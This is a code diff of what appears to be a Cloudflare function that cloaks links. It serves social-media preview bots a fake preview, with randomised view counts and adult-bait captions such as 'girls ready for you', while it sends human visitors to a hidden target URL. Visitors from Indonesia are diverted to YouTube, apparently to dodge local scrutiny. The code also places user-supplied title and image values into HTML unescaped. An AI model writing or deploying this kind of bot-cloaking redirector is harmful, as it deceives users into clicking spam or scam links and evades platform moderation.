@@ -3,7 +3,7 @@ export async function onRequest(context) {
     const base64Data = params.path[0];
     const userAgent = request.headers.get("user-agent") || "";
     
-    // Deteksi Negara (Fitur bawaan Cloudflare)
+    // Deteksi Negara
     const country = request.cf ? request.cf.country : "Unknown";
 
     if (!base64Data || base64Data === "index.html") {
@@ -12,32 +12,33 @@ export async function onRequest(context) {
 
     try {
         const data = JSON.parse(atob(base64Data));
-        const title = data.t || "Premium Content";
+        const title = data.t || "Premium Content"; // Title bersih sesuai input
         const image = data.i || "";
         const target = data.u || "";
 
+        // 1. GENERATE RANDOM DESKRIPSI (Tetap pakai emoji/angka)
         const count = Math.floor(Math.random() * (100000 - 10000 + 1)) + 10000;
         const formattedCount = count.toLocaleString('en-US');
         
         const themes = [
-            { t: `▶️ [PLAY] ${title}`, d: `🎬 Full Video (04:22) - ${formattedCount} views`, type: "video.other" },
-            { t: `💰 [PAID] ${title}`, d: `💳 Unlock Content: $5.00 - Access for ${formattedCount} members`, type: "website" },
-            { t: `💎 [VIP] ${title}`, d: `🔓 Exclusive access for ${formattedCount} girls waiting for you`, type: "website" },
-            { t: `🔴 [LIVE] ${title}`, d: `👥 ${formattedCount} people are watching this live now!`, type: "video.other" },
-            { t: `📥 [DOWNLOAD] ${title}`, d: `💾 File Size: 14.5 MB - ${formattedCount} total downloads`, type: "website" }
+            { d: `▶️ ${formattedCount} girls ready for you...`, type: "video.other" },
+            { d: `💰 Premium Access: ${formattedCount} girls online`, type: "website" },
+            { d: `💎 Exclusive Content: ${formattedCount} active members`, type: "website" },
+            { d: `🔴 LIVE NOW: ${formattedCount} viewers watching`, type: "video.other" },
+            { d: `📥 Download File (${formattedCount} MB) - Fast Link`, type: "website" }
         ];
         
         const s = themes[Math.floor(Math.random() * themes.length)];
         const isBot = /WhatsApp|facebookexternalhit|TelegramBot|Twitterbot|Slackbot/i.test(userAgent);
 
-        // 1. Tampilan untuk Bot (Agar Preview Muncul)
+        // 2. Tampilan untuk Bot (Preview Sosmed)
         if (isBot) {
             return new Response(`<!DOCTYPE html>
             <html>
             <head>
                 <meta charset="UTF-8">
-                <title>${s.t}</title>
-                <meta property="og:title" content="${s.t}" />
+                <title>${title}</title>
+                <meta property="og:title" content="${title}" />
                 <meta property="og:description" content="${s.d}" />
                 <meta property="og:image" content="${image}" />
                 <meta property="og:type" content="${s.type}" />
@@ -49,14 +50,14 @@ export async function onRequest(context) {
             </html>`, { headers: { "content-type": "text/html;charset=UTF-8" } });
         }
 
-        // 2. LOGIC REDIRECT BERDASARKAN NEGARA
+        // 3. LOGIC REDIRECT MANUSIA
         let finalTarget = target.trim();
         
-        // Jika pengunjung dari INDONESIA (ID), arahkan ke YouTube
         if (country === "ID") {
+            // Khusus Indonesia ke YouTube
             finalTarget = "https://www.youtube.com"; 
         } else {
-            // Jika luar Indonesia, arahkan ke target asli
+            // Selain Indonesia ke link target asli
             if (!/^https?:\/\//i.test(finalTarget)) {
                 finalTarget = 'https://' + finalTarget;
             }
